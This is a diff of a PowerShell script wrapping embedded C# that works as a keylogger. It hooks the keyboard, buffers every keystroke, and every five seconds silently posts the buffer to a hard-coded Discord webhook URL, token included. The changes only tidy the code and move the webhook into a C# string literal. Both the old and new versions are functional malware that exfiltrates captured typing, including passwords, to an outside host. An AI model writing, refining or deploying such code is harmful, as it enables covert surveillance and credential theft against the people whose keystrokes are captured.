@@ -1,17 +1,12 @@
-# Your Discord webhook URL for receiving keystroke logs.
-$discordWebhookUrl = "https://discordapp.com/api/webhooks/1408110244558799019/nU-r_w_V3FtUCzX7cv08lV4MhVojEPR0cQ5XsP7dI-HuEDNRvr3gZOOwcRyZnjcmilgO"
-
 Add-Type -AssemblyName System.Windows.Forms
 
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading;
-using System.Diagnostics;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Net.Http;
-using System.Threading.Tasks;
 
 namespace KeyLogger {
     public static class Program {
@@ -24,17 +19,16 @@ namespace KeyLogger {
         private static StringBuilder buffer = new StringBuilder();
         private static readonly object bufferLock = new object();
 
-        private static System.Timers.Timer sendTimer;
+        // Properly embed your Discord webhook URL as a literal string here:
+        private static string discordWebhookUrl = "https://discordapp.com/api/webhooks/1408110244558799019/nU-r_w_V3FtUCzX7cv08lV4MhVojEPR0cQ5XsP7dI-HuEDNRvr3gZOOwcRyZnjcmilgO";
 
-        // Set your Discord webhook URL here
-        private static string discordWebhookUrl = """ + $discordWebhookUrl + @""";
-
+        [STAThread]
         public static void Main() {
-            // Start timer to send collected keys every 5 seconds
-            sendTimer = new System.Timers.Timer(5000);
+            // Setup timer to send collected keys periodically (every 5 seconds)
+            System.Timers.Timer sendTimer = new System.Timers.Timer(5000);
             sendTimer.Elapsed += (s, e) => SendBufferAsync().Wait();
             sendTimer.AutoReset = true;
-            sendTimer.Start();
+            sendTimer.Enabled = true;
 
             hookId = SetHook(hookProc);
             Application.Run();
@@ -51,10 +45,10 @@ namespace KeyLogger {
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                 int vkCode = Marshal.ReadInt32(lParam);
-                string key = ConvertKeyToString(vkCode);
-                if (!string.IsNullOrEmpty(key)) {
+                string keyStr = ConvertKeyToString(vkCode);
+                if (!string.IsNullOrEmpty(keyStr)) {
                     lock(bufferLock) {
-                        buffer.Append(key);
+                        buffer.Append(keyStr);
                     }
                 }
             }
@@ -68,17 +62,19 @@ namespace KeyLogger {
                 dataToSend = buffer.ToString();
                 buffer.Clear();
             }
+
             try {
-                using (var client = new HttpClient()) {
-                    var content = new StringContent("{\"content\": \"" + EscapeForJson(dataToSend) + "\"}", Encoding.UTF8, "application/json");
+                using (HttpClient client = new HttpClient()) {
+                    string payload = "{\"content\": \"" + EscapeForJson(dataToSend) + "\"}";
+                    StringContent content = new StringContent(payload, Encoding.UTF8, "application/json");
                     await client.PostAsync(discordWebhookUrl, content);
                 }
             } catch {
-                // silently ignore exceptions to not disrupt keylogging
+                // ignore exceptions silently
             }
         }
 
-        // Escape for JSON string content
+        // Escape special characters for JSON string
         private static string EscapeForJson(string s) {
             return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
         }
@@ -93,15 +89,12 @@ namespace KeyLogger {
                 return upper ? c.ToString() : c.ToString().ToLower();
             }
             if (vkCode >= 0x30 && vkCode <= 0x39) {
-                if (shiftPressed) {
-                    return ShiftNumberToSymbol((char)vkCode);
-                } else {
-                    return ((char)vkCode).ToString();
-                }
+                if (shiftPressed) return ShiftNumberToSymbol((char)vkCode);
+                return ((char)vkCode).ToString();
             }
-            if (vkCode >= 0x60 && vkCode <= 0x69) {
+            if (vkCode >= 0x60 && vkCode <= 0x69)
                 return (vkCode - 0x60).ToString();
-            }
+
             switch (vkCode) {
                 case 0x20: return " ";
                 case 0x0D: return "\n";
@@ -150,6 +143,6 @@ namespace KeyLogger {
         private static extern short GetKeyState(int nVirtKey);
     }
 }
-"@ -ReferencedAssemblies System.Windows.Forms
+"@
 
 [KeyLogger.Program]::Main()
